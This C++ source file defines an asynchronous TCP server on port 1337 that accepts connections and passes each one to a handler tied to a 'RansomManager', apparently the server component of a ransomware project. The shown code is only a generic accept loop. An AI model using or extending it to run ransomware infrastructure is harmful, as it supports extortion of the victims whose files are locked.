#include "TcpServer.h"
#include <iostream>

TcpServer::TcpServer(asio::io_service & io_service, RansomManager& ransomManager)
	: acceptor_(io_service, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 1337))
	, ransomManager_(ransomManager)
{
	start_accept();
}

void TcpServer::start_accept()
{
	TcpConnection::pointer new_connection = TcpConnection::create(acceptor_.get_io_service(), ransomManager_);
	
	acceptor_.async_accept(new_connection->socket(), std::bind(&TcpServer::handle_accept, this, new_connection, asio::placeholders::error));
}

void TcpServer::handle_accept(TcpConnection::pointer new_connection, const asio::error_code & error)
{
	if (!error)
	{
		std::cout << "[Connection] New connection from " << new_connection->socket().remote_endpoint().address() << "\n";
		new_connection->start();
	}
	else
	{
		std::cerr << error.message() << "\n";
	}
	start_accept();
}
